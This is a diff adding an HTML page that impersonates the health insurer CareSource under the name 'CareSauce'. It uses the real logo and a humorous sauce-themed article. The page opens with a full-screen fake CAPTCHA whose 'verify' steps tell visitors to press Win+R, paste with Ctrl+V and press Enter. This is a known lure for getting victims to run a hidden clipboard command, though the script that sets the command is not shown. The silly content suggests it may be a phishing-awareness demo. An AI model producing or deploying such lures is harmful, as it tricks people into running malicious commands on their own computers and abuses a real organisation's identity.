@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to CareSauce - CareSauce</title>
+  
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+  <!-- CSS Libraries -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css" rel="stylesheet">
+
+  <!-- Custom Styles -->
+  <link href="css/style.css" rel="stylesheet">
+  <link href="src/fakerecaptcha.css" rel="stylesheet">	
+    <style>
+	
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f8f9fa;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ffffff 0%, #ffffff 100%);
+            color: white;
+            padding: 1rem 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            height: 50px;
+            width: auto;
+        }
+
+        .logo img {
+            height: 100%;
+            width: auto;
+        }
+
+        .nav {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav a {
+            color: #8b8b8d;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav a:hover {
+            color: #9455a4;
+        }
+
+        .breadcrumb {
+            background-color: white;
+            padding: 1rem 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .article-header {
+            background: white;
+            padding: 3rem 0;
+            margin-bottom: 2rem;
+            border-radius: 0 0 15px 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+
+        .article-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #9455a4;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 2rem;
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+        }
+
+        .article-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .hero-image {
+            width: 100%;
+            max-width: 800px;
+            height: 400px;
+            object-fit: cover;
+            border-radius: 10px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            margin: 2rem auto;
+            display: block;
+        }
+
+        .image-caption {
+            font-size: 0.9rem;
+            color: #666;
+            font-style: italic;
+            text-align: center;
+            margin-top: 1rem;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .article-content {
+            background: white;
+            padding: 3rem;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+
+        .article-content p {
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        .article-content p:first-child {
+            font-weight: 600;
+            font-size: 1.15rem;
+            color: #4C1D95;
+        }
+
+        .quote {
+            background: linear-gradient(135deg, #FAF5FF 0%, #F3E8FF 100%);
+            border-left: 4px solid #9455a4;
+            padding: 1.5rem 2rem;
+            margin: 2rem 0;
+            border-radius: 0 10px 10px 0;
+            font-style: italic;
+            position: relative;
+        }
+
+        .quote::before {
+            content: '"';
+            font-size: 4rem;
+            color: #9455a4;
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            opacity: 0.3;
+        }
+
+        .quote-author {
+            font-weight: 600;
+            color: #9455a4;
+            margin-top: 1rem;
+            font-style: normal;
+        }
+
+        .sidebar {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+
+        .sidebar h3 {
+            color: #9455a4;
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+        }
+
+        .sidebar ul {
+            list-style: none;
+        }
+
+        .sidebar li {
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .sidebar li:last-child {
+            border-bottom: none;
+        }
+
+        .footer {
+            background: linear-gradient(135deg, #4C1D95 0%, #2D1065 100%);
+            color: white;
+            padding: 3rem 0;
+            margin-top: 3rem;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer h4 {
+            color: #A78BFA;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #A78BFA;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #7C3AED;
+            padding-top: 2rem;
+            text-align: center;
+            color: #C4B5FD;
+        }
+		
+		.center {
+			text-align: center;
+			list-style-position: inside;
+		
+		
+		
+		}
+		
+		ol.center-list {
+			display: table;
+			list-style-position: inside;
+		}
+		
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+                text-align: center;
+            }
+
+            .nav {
+                justify-content: center;
+            }
+
+            .logo {
+                height: 40px;
+            }
+
+            .article-title {
+                font-size: 2rem;
+            }
+
+            .article-meta {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+
+            .article-content {
+                padding: 2rem 1.5rem;
+            }
+
+            .container {
+                padding: 0 1rem;
+            }
+        }
+    </style>
+</head>
+
+<body class="captcha-active">
+  <!-- CAPTCHA Overlay -->
+  <div class="fkrc-container fkrc-m-p">
+    <div class="fkrc-blur-overlay"></div>
+    <div class="fkrc-widget">
+      <div class="fkrc-checkbox-window fkrc-m-p fkrc-block" id="fkrc-checkbox-window">
+        <div class="fkrc-checkbox-container fkrc-m-p">
+          <button class="fkrc-checkbox fkrc-m-p fkrc-line-normal" id="fkrc-checkbox" type="button"></button>
+        </div>
+        <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">I'm not a robot</p>
+        <img alt="" class="fkrc-captcha-logo fkrc-line-normal" src="images/captcha_logo.svg"/>
+        <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">CAPTCHA</p>
+        <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">Privacy - Terms</p>
+        <img alt="" class="fkrc-spinner fkrc-m-p fkrc-line-normal" id="fkrc-spinner" src="images/captcha_spinner.gif"/>
+      </div>
+      <div class="fkrc-verifywin-window" id="fkrc-verifywin-window">
+        <div class="fkrc-verifywin-container">
+          <header class="fkrc-verifywin-header">
+            <span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block">Please Verify Yourself</span>
+            <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">Follow the steps below</span>
+          </header>
+<main class="fkrc-verifywin-main" style="color: #000; font-weight: 700;">
+  <ol class="center-list">
+    <li>Press <span style="border: 1px solid #ccc; padding: 2px 6px; border-radius: 4px; background: #eee; font-family: monospace;">Win</span> + <span style="border: 1px solid #ccc; padding: 2px 6px; border-radius: 4px; background: #eee; font-family: monospace;">R</span></li>
+    <li>Press <span style="border: 1px solid #ccc; padding: 2px 6px; border-radius: 4px; background: #eee; font-family: monospace;">Ctrl</span> + <span style="border: 1px solid #ccc; padding: 2px 6px; border-radius: 4px; background: #eee; font-family: monospace;">V</span></li>
+    <li>Press <span style="border: 1px solid #ccc; padding: 2px 6px; border-radius: 4px; background: #eee; font-family: monospace;">Enter</span></li>
+  </ol>
+</main>
+        </div>
+        <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
+          <div class="fkrc-verifywin-footer-left">Press the verify button to proceed.</div>
+          <button class="fkrc-verifywin-verify-button fkrc-block" id="fkrc-verifywin-verify-button" type="button">Verify</button>
+        </footer>
+      </div>
+      <img alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow" src="images/captcha_arrow.svg"/>
+    </div>
+  </div>
+  
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <img src="https://www.caresource.com/wp-content/themes/the-next-generation/assets/images/cs-tertiary-primary.svg" alt="CareSource Logo">
+            </div>
+            <nav class="nav">
+                <a href="#">About</a>
+                <a href="#">Members</a>
+                <a href="#">Providers</a>
+                <a href="#">Newsroom</a>
+                <a href="#">Contact</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <article class="article-header">
+            <h1 class="article-title">Huge CareSauce Announcement!</h1>
+            <div class="article-meta">
+                <span>📅 June 17th, 2025</span>
+                <span>⏱️ 2 min read</span>
+            </div>
+            
+            <img src="https://www.caresource.com/wp-content/themes/the-next-generation/assets/images/cs-tertiary-primary.svg" class="hero-image">
+            
+            
+        </article>
+
+        <div class="article-content">
+            <p><strong>DAYTON, Ohio (CareSource)</strong> - The humble sauce has undergone what can only be described as a renaissance in recent years, transforming from simple condiment to culinary cornerstone. What began as basic ketchup and mustard on grocery store shelves has evolved into an entire ecosystem of flavor profiles, heat levels, and artisanal craftsmanship that would make even the most seasoned chef weep tears of pure, unadulterated joy.</p>
+
+            <div class="quote">
+                You know, people don't realize that sauce isn't just about adding flavor - it's about creating an experience. When I see someone reach for that bottle of sriracha mayo fusion with ghost pepper undertones, I know they're not just eating, they're embarking on a journey. A journey that might involve sweating, crying, and questioning their life choices, but a journey nonetheless.
+                <div class="quote-author">— Big Sauce, CEO, CareSource</div>
+            </div>
+
+            <p>The sauce revolution didn't happen overnight, mind you. It started small, perhaps with some brave soul deciding that regular hot sauce wasn't quite cutting it anymore. Maybe they thought, "You know what this perfectly good food needs? Something that will make me question my ability to taste anything for the next three days." And thus, the super-hot sauce movement was born, giving us delightful concoctions with names like "Satan's Breakfast" and "Liquid Regret."</p>
+
+            <p>But it's not just about the heat, oh no. We've got sweet sauces that taste like dessert had a baby with barbecue sauce. We've got umami bombs that somehow manage to taste like the ocean, mushrooms, and your grandmother's cooking all at once. There are sauces that claim to be "artisanal" despite being mass-produced in facilities that probably make more sauce in a day than most small countries consume in a year.</p>
+
+            <p>The craft sauce movement has taken over farmers markets like some sort of delicious invasion. Every weekend warrior with a food processor and access to exotic peppers thinks they can be the next hot sauce mogul. And honestly? Some of them are onto something. There's something magical about a sauce made by someone who clearly spent way too much time thinking about the perfect balance between Carolina Reaper peppers and locally-sourced honey.</p>
+
+            <div class="quote">
+                I started making sauce because I was tired of the same old boring condiments. Now I've got forty-seven different varieties in my refrigerator, and I'm pretty sure some of them are developing their own ecosystems. My friends won't come over for dinner anymore because they're afraid I'll make them try the "experimental batch" that's been fermenting in my basement for six months.
+                <div class="quote-author">— Todd Carlson</div>
+            </div>
+        </div>
+
+        <aside class="sidebar">
+            <h3>Related Articles</h3>
+            <ul>
+                <li><a href="#">CareSource Announces New Wellness Initiative</a></li>
+                <li><a href="#">Employee Health Programs Show Positive Results</a></li>
+                <li><a href="#">Community Partnership Spotlight</a></li>
+                <li><a href="#">2024 Annual Wellness Report</a></li>
+            </ul>
+        </aside>
+    </div>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div>
+                    <h4>About CareSource</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Our Mission</a></li>
+                        <li><a href="#">Leadership</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">News & Updates</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Members</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Find a Doctor</a></li>
+                        <li><a href="#">Member Portal</a></li>
+                        <li><a href="#">Benefits</a></li>
+                        <li><a href="#">Support</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Providers</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Provider Portal</a></li>
+                        <li><a href="#">Resources</a></li>
+                        <li><a href="#">Claims</a></li>
+                        <li><a href="#">Network</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Contact</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">1-855-CARE-123</a></li>
+                        <li><a href="#">Customer Service</a></li>
+                        <li><a href="#">Locations</a></li>
+                        <li><a href="#">Feedback</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 CareSource. All rights reserved. | Privacy Policy | Terms of Use</p>
+            </div>
+        </div>
+    </footer>
+	
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.bundle.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+	<script src="src/fakerecaptcha.js"></script>
+	
+</body>
+</html>
